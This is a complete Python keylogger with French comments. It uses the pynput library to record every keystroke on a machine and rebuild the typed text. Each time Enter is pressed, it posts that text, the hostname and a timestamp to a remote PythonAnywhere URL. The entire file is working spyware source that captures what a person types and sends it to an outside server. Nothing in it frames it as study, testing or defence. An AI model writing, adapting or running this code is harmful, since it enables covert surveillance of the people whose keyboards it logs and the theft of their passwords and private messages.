from pynput import keyboard
import requests
import json
import socket
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.logs = ""
        self.machine_id = socket.gethostname()
        # Remplacez par votre URL PythonAnywhere 
        self.api_url = "https://kapelo.pythonanywhere.com/log"
        print(f"Keylogger démarré sur {self.machine_id}")
        
    def _format_key(self, key):
        """Formater les touches de manière plus lisible"""
        # Gestion de la touche Backspace
        if key == keyboard.Key.backspace:
            if self.logs:  # Si le buffer n'est pas vide
                self.logs = self.logs[:-1]  # Supprimer le dernier caractère
            return ""
        
        # Gestion de la touche espace
        if key == keyboard.Key.space:
            return " "
            
        # Gestion des caractères normaux
        if hasattr(key, 'char'):
            return str(key.char)
            
        # Pour les autres touches spéciales (sauf backspace)
        return ""

    def on_press(self, key):
        try:
            # Si c'est la touche Enter
            if key == keyboard.Key.enter:
                print(f"Envoi des données: {self.logs}")
                self.send_logs()  # Envoyer les données
                return

            # Pour toutes les autres touches
            current_key = self._format_key(key)
            if current_key != "":  # Si ce n'est pas une touche spéciale ignorée
                self.logs += current_key
            print(f"Buffer actuel: {self.logs}")

        except Exception as e:
            print(f"Erreur lors de la capture: {e}")
        
    def send_logs(self):
        """Envoyer les logs au serveur"""
        if not self.logs.strip():  # Ne pas envoyer si vide ou que des espaces
            return

        try:
            data = {
                "machine_id": self.machine_id,
                "timestamp": datetime.now().isoformat(),
                "keystrokes": self.logs
            }
            
            print(f"Tentative d'envoi: {data}")
            response = requests.post(
                self.api_url,
                json=data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print("Données envoyées avec succès!")
                self.logs = ""  # Réinitialiser les logs après envoi réussi
            else:
                print(f"Erreur lors de l'envoi: {response.status_code}")
        except Exception as e:
            print(f"Erreur d'envoi: {e}")
            
    def start(self):
        print("Démarrage du keylogger...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            print("En écoute des touches...")
            listener.join()

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except Exception as e:
        print(f"Erreur critique: {e}") 